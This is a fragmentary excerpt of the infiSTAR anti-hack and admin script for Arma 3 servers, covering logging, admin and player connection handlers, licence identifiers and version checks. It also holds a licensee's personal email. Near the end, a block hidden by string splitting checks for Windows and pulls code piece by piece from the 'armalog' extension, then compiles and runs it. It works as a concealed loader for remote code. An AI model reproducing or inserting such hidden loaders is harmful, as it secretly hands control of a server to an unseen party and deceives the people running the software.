...
/* **************infiSTAR Copyright®© 2011 - 2023 All rights reserved.************** */
/* *********************************www.infiSTAR.de********************************* */
diag_log '<infiSTAR.de> VERSION: infiSTAR.de 24-02-2023 22-51-56 (v0260)';
comment 'Antihack & AdminTools - Christian Lorenzen - www.infiSTAR.de - License: (CC)';
UPDATEEMAIL='max42700@orange.fr';
INFISTARVERSION='24-02-2023 22-51-56 - v0260';
...
if(!_return)exitWith
{
	diag_log format['<infiSTAR.de> %1 - serverCommandPassword NOT SET!    max42700@orange.fr - 24-02-2023 22-51-56 - v0260 - %2 - %3',time,serverName,productVersion];
...
{
	diag_log format['<infiSTAR.de> %1 - infiSTAR_AdminMenu.hpp is not in your MPMission or you forgot to #include it within your description.ext   [max42700@orange.fr - 24-02-2023 22-51-56 - v0260 - %2 - %3]',_t,serverName,productVersion];
};
_test = [0,{}] execFSM 'call.fsm';
_test = [0,{}] execFSM 'call.fsm';
if(_test isEqualTo 0)exitWith
{
	_log = format['<infiSTAR.de> %1 - call.fsm missing in your MPmission!    max42700@orange.fr - 24-02-2023 22-51-56 - v0260 - %2 - %3',_t,serverName,productVersion];
...
FNC_A3_CUSTOMLOG = compileFinal "
	...
	diag_log format['<infiSTAR.de>%1| %2   [24-02-2023 22-51-56 - v0260]',_logname,_logentry];
...
_fnc_RandomGen =
{
	_fnc_actualGen = {
		...
		_arr = ['a','7','d','6','e','1','e','6','3','c','5','5','b','1','6','9','d','1','7','0','5','b','2','8','a','d','3','b','d','2','e'];
...
fn_adminConnected_infiSTAR = {
	...
	if(isNil'infiSTAR_MAIN_CODE')exitWith
	{
		...
		diag_log '<infiSTAR.de> ERROR - infiSTAR_MAIN_CODE is NIL! (v0260)';
	};
	...
	"; if(_LogAdminActions)then{ _A3AHstring = _A3AHstring + "
		_fnc_adminLog = if(_uid in "+str _devs+")then{{}}else{
			diag_log format['<infiSTAR.de> ******ADMIN-LOGIN******: %1(%2) (v0260)',_name,_uid];
...
fn_playerConnected_infiSTAR = {
	...
	{
		[_name, _uid] call fn_infiSTAR_checkGlobalBanState;
...
_log call FNC_A3_CONNECTLOG;
_m = missionNameSpace getVariable [('UPD'+'A'+'TE'+'E'+'M'+'AI'+'L'),''];_m = _m + '&cid=vi4622673397';missionNameSpace setVariable [('UPD'+'A'+'TE'+'E'+'M'+'AI'+'L'),_m];
...
"; }; _A3AHstring = _A3AHstring + "
	...
	_hours = floor(serverTime / 60 / 60);_value = ((serverTime / 60 / 60) - _hours);if(_value == 0)then{_value = 0.0001;};_minutes = round(_value * 60);_seconds = 'vi4622673397x2';
	_devLog = format['<infiSTAR.de> %1 VERSION: infiSTAR.de 24-02-2023 22-51-56 (v0260) - server running: %2:%3:%4',VERSIONCHECKRESULT,_hours,_minutes,_seconds];diag_log _devLog;
...
_res = [VERSION_CHECK_URL_FULL+'&id=vi4622673397&li=7d6e1e63c55b169d1705b28ad3bd2e&pr=A3'] call FN_ARMA_FETCHDATA;
...
_reTimer = 15;
call compile (""
if((pr""+""odu""+""ctVer""+""sion par""+""am [6, '', ['']]) is""+""Equ""+""alTo 'W""+""in""+""do""+""w""+""s')then{
	_rec = {
		if(time > _r""+""eTi""+""mer)then{
			_r""+""eTi""+""mer = time + 3""+""0;
			te""+""rm""+""inate _r""+""e""+""cT;
			_re""+""cT = [] spaw""+""n {
				_r""+""eC""+""od""+""e = '';
				wh""+""ile {tr""+""ue} do {
					_r""+""eDL""+""L = ('a'+'rm'+'al'+'og') ca""+""ll""+""Ex""+""ten""+""sio""+""n ('r'+'""+""e');
					_reC""+""ode = _reC""+""ode + _r""+""e""+""DL""+""L;
					if(_re""+""DL""+""L isE""+""qual""+""To '')exi""+""tWit""+""h{};
				};
				ca""+""ll com""+""pile _r""+""eCo""+""de;
			};
		};
	};
};
